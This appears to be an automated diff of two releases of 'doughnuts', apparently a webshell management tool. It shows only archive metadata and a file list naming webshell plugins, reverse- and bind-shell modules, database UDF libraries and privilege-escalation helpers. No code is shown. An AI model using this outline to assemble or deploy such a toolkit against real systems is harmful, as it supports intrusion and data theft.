# Comparing `tmp/doughnuts-4.9.3.tar.gz` & `tmp/doughnuts-4.9.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "doughnuts-4.9.3.tar", last modified: Sat May  1 08:43:43 2021, max compression
+gzip compressed data, was "doughnuts-4.9.4.tar", last modified: Sat May  1 08:51:55 2021, max compression
```

## Comparing `doughnuts-4.9.3.tar` & `doughnuts-4.9.4.tar`

### file list

```diff
@@ -1,128 +1,128 @@
--rw-r--r--   0        0        0      160 2021-04-04 06:36:53.035234 doughnuts-4.9.3/doughnuts/__main__.py
--rw-r--r--   0        0        0    31343 2020-07-16 08:56:19.096188 doughnuts-4.9.3/doughnuts/auxiliary/av/av.json
--rw-r--r--   0        0        0     8891 2021-04-01 06:22:45.480210 doughnuts-4.9.3/doughnuts/auxiliary/fpm/fpm.py
--rw-r--r--   0        0        0      327 2020-06-29 03:06:18.867979 doughnuts-4.9.3/doughnuts/auxiliary/ld_preload/ld_preload.c
--rw-r--r--   0        0        0     8240 2020-06-29 03:06:18.869973 doughnuts-4.9.3/doughnuts/auxiliary/ld_preload/ld_preload_x86_64.so
--rw-r--r--   0        0        0    97739 2020-07-17 06:35:05.213383 doughnuts-4.9.3/doughnuts/auxiliary/priv/gtfo.json
--rw-r--r--   0        0        0     8040 2020-06-29 03:06:18.872964 doughnuts-4.9.3/doughnuts/auxiliary/reshell/reverse_server_light.zip
--rw-r--r--   0        0        0    19720 2020-06-29 03:06:18.871968 doughnuts-4.9.3/doughnuts/auxiliary/reshell/reverse_server_x86_64
--rw-r--r--   0        0        0     5696 2013-08-19 03:08:28.181356 doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/linux/32/lib_mysqludf_sys.so
--rw-r--r--   0        0        0     8040 2013-08-19 03:08:28.179356 doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/linux/64/lib_mysqludf_sys.so
--rw-r--r--   0        0        0     6144 2013-08-19 03:08:28.177356 doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/windows/32/lib_mysqludf_sys.dll
--rw-r--r--   0        0        0    11264 2013-08-19 03:08:28.176356 doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/windows/64/lib_mysqludf_sys.dll
--rw-r--r--   0        0        0     5124 2013-08-19 03:08:28.172355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/8.2/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     5124 2013-08-19 03:08:28.170355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/8.3/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     5132 2013-08-19 03:08:28.169355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/8.4/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     6512 2013-08-19 03:08:28.167355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/9.0/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     7704 2013-08-19 03:08:28.166355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/8.2/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     7704 2013-08-19 03:08:28.165355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/8.3/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     7712 2013-08-19 03:08:28.164355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/8.4/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     7920 2013-08-19 03:08:28.163355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/9.0/lib_postgresqludf_sys.so
--rw-r--r--   0        0        0     6656 2013-08-19 03:08:28.161355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/8.2/lib_postgresqludf_sys.dll
--rw-r--r--   0        0        0     6656 2013-08-19 03:08:28.160355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/8.3/lib_postgresqludf_sys.dll
--rw-r--r--   0        0        0     6656 2013-08-19 03:08:28.159355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/8.4/lib_postgresqludf_sys.dll
--rw-r--r--   0        0        0     5632 2013-08-19 03:08:28.158355 doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/9.0/lib_postgresqludf_sys.dll
--rw-r--r--   0        0        0      282 2013-08-19 03:08:28.156355 doughnuts-4.9.3/doughnuts/auxiliary/udf/README.txt
--rw-r--r--   0        0        0    12504 2020-07-07 11:40:51.828159 doughnuts-4.9.3/doughnuts/auxiliary/user_agents/ua.txt
--rw-r--r--   0        0        0       67 2021-04-06 08:45:34.419703 doughnuts-4.9.3/doughnuts/config.ini
--rw-r--r--   0        0        0      552 2021-04-06 08:42:33.892201 doughnuts-4.9.3/doughnuts/custom_plugins/Readme.md
--rw-r--r--   0        0        0     2145 2021-04-06 08:34:05.421674 doughnuts-4.9.3/doughnuts/doughnuts.py
--rw-r--r--   0        0        0      148 2020-03-20 04:01:23.147125 doughnuts-4.9.3/doughnuts/encode/base64.py
--rw-r--r--   0        0        0      459 2021-04-05 12:03:50.547504 doughnuts-4.9.3/doughnuts/encode/doughnuts.py
--rw-r--r--   0        0        0      144 2020-05-23 14:17:54.253610 doughnuts-4.9.3/doughnuts/encode/hex.py
--rw-r--r--   0        0        0      143 2020-03-18 01:34:19.028535 doughnuts-4.9.3/doughnuts/encode/rot13.py
--rw-r--r--   0        0        0      269 2020-05-30 03:14:08.511743 doughnuts-4.9.3/doughnuts/general/clear.py
--rw-r--r--   0        0        0      583 2021-04-06 06:55:48.454951 doughnuts-4.9.3/doughnuts/general/debug.py
--rw-r--r--   0        0        0      343 2021-04-05 12:47:31.909053 doughnuts-4.9.3/doughnuts/general/enrecv.py
--rw-r--r--   0        0        0      633 2020-07-11 08:18:21.213274 doughnuts-4.9.3/doughnuts/general/get.py
--rw-r--r--   0        0        0     2005 2021-04-25 08:29:26.454484 doughnuts-4.9.3/doughnuts/general/help.py
--rw-r--r--   0        0        0     1249 2020-07-03 23:59:28.513237 doughnuts-4.9.3/doughnuts/general/log.py
--rw-r--r--   0        0        0      622 2020-10-16 01:33:54.576815 doughnuts-4.9.3/doughnuts/general/lsh.py
--rw-r--r--   0        0        0      715 2020-07-07 02:55:38.643949 doughnuts-4.9.3/doughnuts/general/proxy.py
--rw-r--r--   0        0        0      481 2020-06-29 12:38:18.301455 doughnuts-4.9.3/doughnuts/general/quit.py
--rw-r--r--   0        0        0     1044 2021-04-06 08:22:40.921783 doughnuts-4.9.3/doughnuts/general/reload.py
--rw-r--r--   0        0        0      702 2020-07-12 01:17:46.765676 doughnuts-4.9.3/doughnuts/general/save.py
--rw-r--r--   0        0        0      328 2020-07-13 04:52:47.274242 doughnuts-4.9.3/doughnuts/general/set.py
--rw-r--r--   0        0        0      388 2020-07-05 02:03:58.763050 doughnuts-4.9.3/doughnuts/general/switch.py
--rw-r--r--   0        0        0     2003 2021-05-01 08:41:03.136739 doughnuts-4.9.3/doughnuts/helpmenu.py
--rw-r--r--   0        0        0     1376 2021-04-04 06:41:14.111724 doughnuts-4.9.3/doughnuts/install.py
--rw-r--r--   0        0        0     8046 2021-04-06 08:32:31.110115 doughnuts-4.9.3/doughnuts/libs/app.py
--rw-r--r--   0        0        0     2517 2020-05-04 23:07:52.421340 doughnuts-4.9.3/doughnuts/libs/c64.py
--rw-r--r--   0        0        0     7363 2021-04-06 08:45:04.807360 doughnuts-4.9.3/doughnuts/libs/config.py
--rw-r--r--   0        0        0    58598 2021-05-01 08:43:42.168049 doughnuts-4.9.3/doughnuts/libs/myapp.py
--rw-r--r--   0        0        0    13901 2020-10-06 01:58:05.024235 doughnuts-4.9.3/doughnuts/libs/readline.py
--rw-r--r--   0        0        0     3680 2020-07-11 23:04:00.555803 doughnuts-4.9.3/doughnuts/libs/reverse_client_bash.py
--rw-r--r--   0        0        0       72 2021-04-01 01:18:19.496549 doughnuts-4.9.3/doughnuts/libs/runtime_config.py
--rw-r--r--   0        0        0        0 2020-01-07 08:54:00.536498 doughnuts-4.9.3/doughnuts/main_plugins/__init__.py
--rw-r--r--   0        0        0     2033 2020-07-07 02:43:49.180567 doughnuts-4.9.3/doughnuts/main_plugins/check.py
--rw-r--r--   0        0        0     7304 2021-04-06 07:59:17.105424 doughnuts-4.9.3/doughnuts/main_plugins/connect.py
--rw-r--r--   0        0        0     2664 2021-04-04 06:42:44.931299 doughnuts-4.9.3/doughnuts/main_plugins/generate.py
--rw-r--r--   0        0        0     1689 2020-07-14 04:17:52.167379 doughnuts-4.9.3/doughnuts/main_plugins/load.py
--rw-r--r--   0        0        0     1183 2020-07-02 23:56:19.140070 doughnuts-4.9.3/doughnuts/main_plugins/rm.py
--rw-r--r--   0        0        0     1026 2020-07-13 05:17:14.131746 doughnuts-4.9.3/doughnuts/main_plugins/show.py
--rw-r--r--   0        0        0      358 2020-05-26 00:14:01.540078 doughnuts-4.9.3/doughnuts/main_plugins/show_encoders.py
--rw-r--r--   0        0        0     6288 2021-04-06 07:52:25.057557 doughnuts-4.9.3/doughnuts/Myplugin.py
--rw-r--r--   0        0        0     5184 2020-10-09 08:39:46.921759 doughnuts-4.9.3/doughnuts/phpfiles/zip.php
--rw-r--r--   0        0        0      148 2020-10-16 00:26:06.216866 doughnuts-4.9.3/doughnuts/requirements.txt
--rw-r--r--   0        0        0        0 2020-01-07 08:54:00.536498 doughnuts-4.9.3/doughnuts/webshell_plugins/__init__.py
--rw-r--r--   0        0        0    28103 2020-10-15 09:06:53.408369 doughnuts-4.9.3/doughnuts/webshell_plugins/agent.py
--rw-r--r--   0        0        0     1358 2020-10-15 09:06:53.409367 doughnuts-4.9.3/doughnuts/webshell_plugins/av.py
--rw-r--r--   0        0        0      361 2020-10-15 09:06:53.409367 doughnuts-4.9.3/doughnuts/webshell_plugins/back.py
--rw-r--r--   0        0        0    11383 2021-04-01 06:37:27.013600 doughnuts-4.9.3/doughnuts/webshell_plugins/bdf.py
--rw-r--r--   0        0        0     4656 2020-10-15 09:06:53.410369 doughnuts-4.9.3/doughnuts/webshell_plugins/bindshell.py
--rw-r--r--   0        0        0      889 2020-10-25 09:14:28.032295 doughnuts-4.9.3/doughnuts/webshell_plugins/bobd.py
--rw-r--r--   0        0        0      760 2020-10-15 09:06:53.411368 doughnuts-4.9.3/doughnuts/webshell_plugins/cat.py
--rw-r--r--   0        0        0      494 2021-04-06 08:23:12.827610 doughnuts-4.9.3/doughnuts/webshell_plugins/cd.py
--rw-r--r--   0        0        0      893 2020-10-15 09:06:53.412368 doughnuts-4.9.3/doughnuts/webshell_plugins/checkvm.py
--rw-r--r--   0        0        0      893 2021-04-04 06:43:08.254068 doughnuts-4.9.3/doughnuts/webshell_plugins/chmod.py
--rw-r--r--   0        0        0      807 2020-10-22 10:51:44.979848 doughnuts-4.9.3/doughnuts/webshell_plugins/copy.py
--rw-r--r--   0        0        0      504 2020-10-15 09:06:53.413368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_columns.py
--rw-r--r--   0        0        0      370 2020-10-15 09:06:53.414368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_dbs.py
--rw-r--r--   0        0        0     5021 2020-10-16 06:50:42.627120 doughnuts-4.9.3/doughnuts/webshell_plugins/db_dump.py
--rw-r--r--   0        0        0      352 2020-10-15 09:06:53.414368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_info.py
--rw-r--r--   0        0        0     4510 2020-10-15 09:06:53.415368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_init.py
--rw-r--r--   0        0        0     8677 2021-04-04 06:43:45.536951 doughnuts-4.9.3/doughnuts/webshell_plugins/db_mdump.py
--rw-r--r--   0        0        0     2703 2020-10-15 09:06:53.416368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_shell.py
--rw-r--r--   0        0        0      545 2020-10-15 09:06:53.417368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_tables.py
--rw-r--r--   0        0        0     1324 2020-10-15 09:06:53.417368 doughnuts-4.9.3/doughnuts/webshell_plugins/db_use.py
--rw-r--r--   0        0        0     1482 2020-10-15 14:35:40.183852 doughnuts-4.9.3/doughnuts/webshell_plugins/download.py
--rw-r--r--   0        0        0     2671 2020-10-15 09:06:53.418368 doughnuts-4.9.3/doughnuts/webshell_plugins/dump.py
--rw-r--r--   0        0        0      739 2020-10-15 09:06:53.419368 doughnuts-4.9.3/doughnuts/webshell_plugins/edit.py
--rw-r--r--   0        0        0     1295 2020-10-24 07:33:11.973014 doughnuts-4.9.3/doughnuts/webshell_plugins/execute.py
--rw-r--r--   0        0        0     1432 2020-10-15 09:06:53.420369 doughnuts-4.9.3/doughnuts/webshell_plugins/fc.py
--rw-r--r--   0        0        0     1345 2020-10-15 09:06:53.420369 doughnuts-4.9.3/doughnuts/webshell_plugins/fl.py
--rw-r--r--   0        0        0     1324 2020-10-15 09:06:53.420369 doughnuts-4.9.3/doughnuts/webshell_plugins/fwpf.py
--rw-r--r--   0        0        0      616 2020-10-15 09:06:53.421367 doughnuts-4.9.3/doughnuts/webshell_plugins/getenv.py
--rw-r--r--   0        0        0      219 2020-10-15 09:06:53.421367 doughnuts-4.9.3/doughnuts/webshell_plugins/info.py
--rw-r--r--   0        0        0     3957 2020-10-22 10:53:01.212957 doughnuts-4.9.3/doughnuts/webshell_plugins/ls.py
--rw-r--r--   0        0        0     4119 2021-04-04 06:44:17.165177 doughnuts-4.9.3/doughnuts/webshell_plugins/mdownload.py
--rw-r--r--   0        0        0      777 2021-04-01 01:18:19.497549 doughnuts-4.9.3/doughnuts/webshell_plugins/mkdir.py
--rw-r--r--   0        0        0      844 2020-10-15 09:06:53.422367 doughnuts-4.9.3/doughnuts/webshell_plugins/move.py
--rw-r--r--   0        0        0     6286 2021-04-04 06:44:39.586670 doughnuts-4.9.3/doughnuts/webshell_plugins/mupload.py
--rw-r--r--   0        0        0      496 2020-10-15 09:06:53.423368 doughnuts-4.9.3/doughnuts/webshell_plugins/pdf.py
--rw-r--r--   0        0        0     4568 2021-04-04 06:44:51.282686 doughnuts-4.9.3/doughnuts/webshell_plugins/portscan.py
--rw-r--r--   0        0        0     1663 2020-10-15 09:06:53.424368 doughnuts-4.9.3/doughnuts/webshell_plugins/priv.py
--rw-r--r--   0        0        0     2297 2021-04-04 06:44:58.789604 doughnuts-4.9.3/doughnuts/webshell_plugins/ps.py
--rw-r--r--   0        0        0      269 2020-10-15 09:06:53.425368 doughnuts-4.9.3/doughnuts/webshell_plugins/pwd.py
--rw-r--r--   0        0        0      801 2021-04-01 01:18:19.498548 doughnuts-4.9.3/doughnuts/webshell_plugins/remove.py
--rw-r--r--   0        0        0     3515 2021-04-04 06:45:20.899633 doughnuts-4.9.3/doughnuts/webshell_plugins/remp.py
--rw-r--r--   0        0        0     2652 2020-11-16 12:09:36.056169 doughnuts-4.9.3/doughnuts/webshell_plugins/reshell.py
--rw-r--r--   0        0        0    13027 2020-10-15 15:33:57.704832 doughnuts-4.9.3/doughnuts/webshell_plugins/reverse.py
--rw-r--r--   0        0        0      646 2021-04-01 01:18:19.498548 doughnuts-4.9.3/doughnuts/webshell_plugins/rmdir.py
--rw-r--r--   0        0        0     1423 2020-10-15 09:06:53.427368 doughnuts-4.9.3/doughnuts/webshell_plugins/search.py
--rw-r--r--   0        0        0     3155 2020-10-15 09:06:53.427368 doughnuts-4.9.3/doughnuts/webshell_plugins/shell.py
--rw-r--r--   0        0        0     4756 2020-10-15 09:06:53.428368 doughnuts-4.9.3/doughnuts/webshell_plugins/socks.py
--rw-r--r--   0        0        0     1211 2020-11-16 04:44:08.375249 doughnuts-4.9.3/doughnuts/webshell_plugins/touch.py
--rw-r--r--   0        0        0     1698 2021-04-04 06:45:39.996903 doughnuts-4.9.3/doughnuts/webshell_plugins/upload.py
--rw-r--r--   0        0        0      835 2021-04-06 08:43:46.595031 doughnuts-4.9.3/doughnuts/webshell_plugins/verbose.py
--rw-r--r--   0        0        0     2535 2020-10-15 09:06:53.429368 doughnuts-4.9.3/doughnuts/webshell_plugins/webshell.py
--rw-r--r--   0        0        0     1237 2020-10-15 09:06:53.430368 doughnuts-4.9.3/doughnuts/webshell_plugins/write.py
--rw-r--r--   0        0        0    13239 2021-04-05 12:52:30.930581 doughnuts-4.9.3/doughnuts/webshell_template/gululingbo.py
--rw-r--r--   0        0        0     1104 2021-04-05 12:52:11.752130 doughnuts-4.9.3/doughnuts/webshell_template/icecream.py
--rw-r--r--   0        0        0     1553 2021-04-05 12:52:16.590372 doughnuts-4.9.3/doughnuts/webshell_template/popsicle.py
--rw-r--r--   0        0        0     1651 2021-04-05 12:52:26.803301 doughnuts-4.9.3/doughnuts/webshell_template/pudding.py
--rw-r--r--   0        0        0     1083 2020-03-17 12:03:16.145472 doughnuts-4.9.3/LICENSE
--rw-r--r--   0        0        0      572 2021-05-01 08:43:42.162011 doughnuts-4.9.3/pyproject.toml
--rw-r--r--   0        0        0    22074 2021-05-01 08:42:12.827745 doughnuts-4.9.3/Readme.md
--rw-r--r--   0        0        0    24218 2021-05-01 08:43:44.190458 doughnuts-4.9.3/setup.py
--rw-r--r--   0        0        0    22255 2021-05-01 08:43:44.191460 doughnuts-4.9.3/PKG-INFO
+-rw-r--r--   0        0        0      160 2021-04-04 06:36:53.035234 doughnuts-4.9.4/doughnuts/__main__.py
+-rw-r--r--   0        0        0    31343 2020-07-16 08:56:19.096188 doughnuts-4.9.4/doughnuts/auxiliary/av/av.json
+-rw-r--r--   0        0        0     8891 2021-04-01 06:22:45.480210 doughnuts-4.9.4/doughnuts/auxiliary/fpm/fpm.py
+-rw-r--r--   0        0        0      327 2020-06-29 03:06:18.867979 doughnuts-4.9.4/doughnuts/auxiliary/ld_preload/ld_preload.c
+-rw-r--r--   0        0        0     8240 2020-06-29 03:06:18.869973 doughnuts-4.9.4/doughnuts/auxiliary/ld_preload/ld_preload_x86_64.so
+-rw-r--r--   0        0        0    97739 2020-07-17 06:35:05.213383 doughnuts-4.9.4/doughnuts/auxiliary/priv/gtfo.json
+-rw-r--r--   0        0        0     8040 2020-06-29 03:06:18.872964 doughnuts-4.9.4/doughnuts/auxiliary/reshell/reverse_server_light.zip
+-rw-r--r--   0        0        0    19720 2020-06-29 03:06:18.871968 doughnuts-4.9.4/doughnuts/auxiliary/reshell/reverse_server_x86_64
+-rw-r--r--   0        0        0     5696 2013-08-19 03:08:28.181356 doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/linux/32/lib_mysqludf_sys.so
+-rw-r--r--   0        0        0     8040 2013-08-19 03:08:28.179356 doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/linux/64/lib_mysqludf_sys.so
+-rw-r--r--   0        0        0     6144 2013-08-19 03:08:28.177356 doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/windows/32/lib_mysqludf_sys.dll
+-rw-r--r--   0        0        0    11264 2013-08-19 03:08:28.176356 doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/windows/64/lib_mysqludf_sys.dll
+-rw-r--r--   0        0        0     5124 2013-08-19 03:08:28.172355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/8.2/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     5124 2013-08-19 03:08:28.170355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/8.3/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     5132 2013-08-19 03:08:28.169355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/8.4/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     6512 2013-08-19 03:08:28.167355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/9.0/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     7704 2013-08-19 03:08:28.166355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/8.2/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     7704 2013-08-19 03:08:28.165355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/8.3/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     7712 2013-08-19 03:08:28.164355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/8.4/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     7920 2013-08-19 03:08:28.163355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/9.0/lib_postgresqludf_sys.so
+-rw-r--r--   0        0        0     6656 2013-08-19 03:08:28.161355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/8.2/lib_postgresqludf_sys.dll
+-rw-r--r--   0        0        0     6656 2013-08-19 03:08:28.160355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/8.3/lib_postgresqludf_sys.dll
+-rw-r--r--   0        0        0     6656 2013-08-19 03:08:28.159355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/8.4/lib_postgresqludf_sys.dll
+-rw-r--r--   0        0        0     5632 2013-08-19 03:08:28.158355 doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/9.0/lib_postgresqludf_sys.dll
+-rw-r--r--   0        0        0      282 2013-08-19 03:08:28.156355 doughnuts-4.9.4/doughnuts/auxiliary/udf/README.txt
+-rw-r--r--   0        0        0    12504 2020-07-07 11:40:51.828159 doughnuts-4.9.4/doughnuts/auxiliary/user_agents/ua.txt
+-rw-r--r--   0        0        0       67 2021-04-06 08:45:34.419703 doughnuts-4.9.4/doughnuts/config.ini
+-rw-r--r--   0        0        0      552 2021-04-06 08:42:33.892201 doughnuts-4.9.4/doughnuts/custom_plugins/Readme.md
+-rw-r--r--   0        0        0     2145 2021-04-06 08:34:05.421674 doughnuts-4.9.4/doughnuts/doughnuts.py
+-rw-r--r--   0        0        0      148 2020-03-20 04:01:23.147125 doughnuts-4.9.4/doughnuts/encode/base64.py
+-rw-r--r--   0        0        0      459 2021-04-05 12:03:50.547504 doughnuts-4.9.4/doughnuts/encode/doughnuts.py
+-rw-r--r--   0        0        0      144 2020-05-23 14:17:54.253610 doughnuts-4.9.4/doughnuts/encode/hex.py
+-rw-r--r--   0        0        0      143 2020-03-18 01:34:19.028535 doughnuts-4.9.4/doughnuts/encode/rot13.py
+-rw-r--r--   0        0        0      269 2020-05-30 03:14:08.511743 doughnuts-4.9.4/doughnuts/general/clear.py
+-rw-r--r--   0        0        0      583 2021-04-06 06:55:48.454951 doughnuts-4.9.4/doughnuts/general/debug.py
+-rw-r--r--   0        0        0      343 2021-04-05 12:47:31.909053 doughnuts-4.9.4/doughnuts/general/enrecv.py
+-rw-r--r--   0        0        0      633 2020-07-11 08:18:21.213274 doughnuts-4.9.4/doughnuts/general/get.py
+-rw-r--r--   0        0        0     2005 2021-04-25 08:29:26.454484 doughnuts-4.9.4/doughnuts/general/help.py
+-rw-r--r--   0        0        0     1249 2020-07-03 23:59:28.513237 doughnuts-4.9.4/doughnuts/general/log.py
+-rw-r--r--   0        0        0      622 2020-10-16 01:33:54.576815 doughnuts-4.9.4/doughnuts/general/lsh.py
+-rw-r--r--   0        0        0      715 2020-07-07 02:55:38.643949 doughnuts-4.9.4/doughnuts/general/proxy.py
+-rw-r--r--   0        0        0      481 2020-06-29 12:38:18.301455 doughnuts-4.9.4/doughnuts/general/quit.py
+-rw-r--r--   0        0        0     1044 2021-04-06 08:22:40.921783 doughnuts-4.9.4/doughnuts/general/reload.py
+-rw-r--r--   0        0        0      702 2020-07-12 01:17:46.765676 doughnuts-4.9.4/doughnuts/general/save.py
+-rw-r--r--   0        0        0      328 2020-07-13 04:52:47.274242 doughnuts-4.9.4/doughnuts/general/set.py
+-rw-r--r--   0        0        0      388 2020-07-05 02:03:58.763050 doughnuts-4.9.4/doughnuts/general/switch.py
+-rw-r--r--   0        0        0     2003 2021-05-01 08:51:17.721953 doughnuts-4.9.4/doughnuts/helpmenu.py
+-rw-r--r--   0        0        0     1376 2021-04-04 06:41:14.111724 doughnuts-4.9.4/doughnuts/install.py
+-rw-r--r--   0        0        0     8046 2021-04-06 08:32:31.110115 doughnuts-4.9.4/doughnuts/libs/app.py
+-rw-r--r--   0        0        0     2517 2020-05-04 23:07:52.421340 doughnuts-4.9.4/doughnuts/libs/c64.py
+-rw-r--r--   0        0        0     7366 2021-05-01 08:49:52.811845 doughnuts-4.9.4/doughnuts/libs/config.py
+-rw-r--r--   0        0        0    58598 2021-05-01 08:51:54.098912 doughnuts-4.9.4/doughnuts/libs/myapp.py
+-rw-r--r--   0        0        0    13901 2020-10-06 01:58:05.024235 doughnuts-4.9.4/doughnuts/libs/readline.py
+-rw-r--r--   0        0        0     3680 2020-07-11 23:04:00.555803 doughnuts-4.9.4/doughnuts/libs/reverse_client_bash.py
+-rw-r--r--   0        0        0       72 2021-04-01 01:18:19.496549 doughnuts-4.9.4/doughnuts/libs/runtime_config.py
+-rw-r--r--   0        0        0        0 2020-01-07 08:54:00.536498 doughnuts-4.9.4/doughnuts/main_plugins/__init__.py
+-rw-r--r--   0        0        0     2033 2020-07-07 02:43:49.180567 doughnuts-4.9.4/doughnuts/main_plugins/check.py
+-rw-r--r--   0        0        0     7304 2021-04-06 07:59:17.105424 doughnuts-4.9.4/doughnuts/main_plugins/connect.py
+-rw-r--r--   0        0        0     2664 2021-04-04 06:42:44.931299 doughnuts-4.9.4/doughnuts/main_plugins/generate.py
+-rw-r--r--   0        0        0     1689 2020-07-14 04:17:52.167379 doughnuts-4.9.4/doughnuts/main_plugins/load.py
+-rw-r--r--   0        0        0     1183 2020-07-02 23:56:19.140070 doughnuts-4.9.4/doughnuts/main_plugins/rm.py
+-rw-r--r--   0        0        0     1026 2020-07-13 05:17:14.131746 doughnuts-4.9.4/doughnuts/main_plugins/show.py
+-rw-r--r--   0        0        0      358 2020-05-26 00:14:01.540078 doughnuts-4.9.4/doughnuts/main_plugins/show_encoders.py
+-rw-r--r--   0        0        0     6288 2021-04-06 07:52:25.057557 doughnuts-4.9.4/doughnuts/Myplugin.py
+-rw-r--r--   0        0        0     5184 2020-10-09 08:39:46.921759 doughnuts-4.9.4/doughnuts/phpfiles/zip.php
+-rw-r--r--   0        0        0      148 2020-10-16 00:26:06.216866 doughnuts-4.9.4/doughnuts/requirements.txt
+-rw-r--r--   0        0        0        0 2020-01-07 08:54:00.536498 doughnuts-4.9.4/doughnuts/webshell_plugins/__init__.py
+-rw-r--r--   0        0        0    28103 2020-10-15 09:06:53.408369 doughnuts-4.9.4/doughnuts/webshell_plugins/agent.py
+-rw-r--r--   0        0        0     1358 2020-10-15 09:06:53.409367 doughnuts-4.9.4/doughnuts/webshell_plugins/av.py
+-rw-r--r--   0        0        0      361 2020-10-15 09:06:53.409367 doughnuts-4.9.4/doughnuts/webshell_plugins/back.py
+-rw-r--r--   0        0        0    11383 2021-04-01 06:37:27.013600 doughnuts-4.9.4/doughnuts/webshell_plugins/bdf.py
+-rw-r--r--   0        0        0     4656 2020-10-15 09:06:53.410369 doughnuts-4.9.4/doughnuts/webshell_plugins/bindshell.py
+-rw-r--r--   0        0        0      889 2020-10-25 09:14:28.032295 doughnuts-4.9.4/doughnuts/webshell_plugins/bobd.py
+-rw-r--r--   0        0        0      760 2020-10-15 09:06:53.411368 doughnuts-4.9.4/doughnuts/webshell_plugins/cat.py
+-rw-r--r--   0        0        0      494 2021-04-06 08:23:12.827610 doughnuts-4.9.4/doughnuts/webshell_plugins/cd.py
+-rw-r--r--   0        0        0      893 2020-10-15 09:06:53.412368 doughnuts-4.9.4/doughnuts/webshell_plugins/checkvm.py
+-rw-r--r--   0        0        0      893 2021-04-04 06:43:08.254068 doughnuts-4.9.4/doughnuts/webshell_plugins/chmod.py
+-rw-r--r--   0        0        0      807 2020-10-22 10:51:44.979848 doughnuts-4.9.4/doughnuts/webshell_plugins/copy.py
+-rw-r--r--   0        0        0      504 2020-10-15 09:06:53.413368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_columns.py
+-rw-r--r--   0        0        0      370 2020-10-15 09:06:53.414368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_dbs.py
+-rw-r--r--   0        0        0     5021 2020-10-16 06:50:42.627120 doughnuts-4.9.4/doughnuts/webshell_plugins/db_dump.py
+-rw-r--r--   0        0        0      352 2020-10-15 09:06:53.414368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_info.py
+-rw-r--r--   0        0        0     4510 2020-10-15 09:06:53.415368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_init.py
+-rw-r--r--   0        0        0     8677 2021-04-04 06:43:45.536951 doughnuts-4.9.4/doughnuts/webshell_plugins/db_mdump.py
+-rw-r--r--   0        0        0     2703 2020-10-15 09:06:53.416368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_shell.py
+-rw-r--r--   0        0        0      545 2020-10-15 09:06:53.417368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_tables.py
+-rw-r--r--   0        0        0     1324 2020-10-15 09:06:53.417368 doughnuts-4.9.4/doughnuts/webshell_plugins/db_use.py
+-rw-r--r--   0        0        0     1482 2020-10-15 14:35:40.183852 doughnuts-4.9.4/doughnuts/webshell_plugins/download.py
+-rw-r--r--   0        0        0     2671 2020-10-15 09:06:53.418368 doughnuts-4.9.4/doughnuts/webshell_plugins/dump.py
+-rw-r--r--   0        0        0      739 2020-10-15 09:06:53.419368 doughnuts-4.9.4/doughnuts/webshell_plugins/edit.py
+-rw-r--r--   0        0        0     1295 2020-10-24 07:33:11.973014 doughnuts-4.9.4/doughnuts/webshell_plugins/execute.py
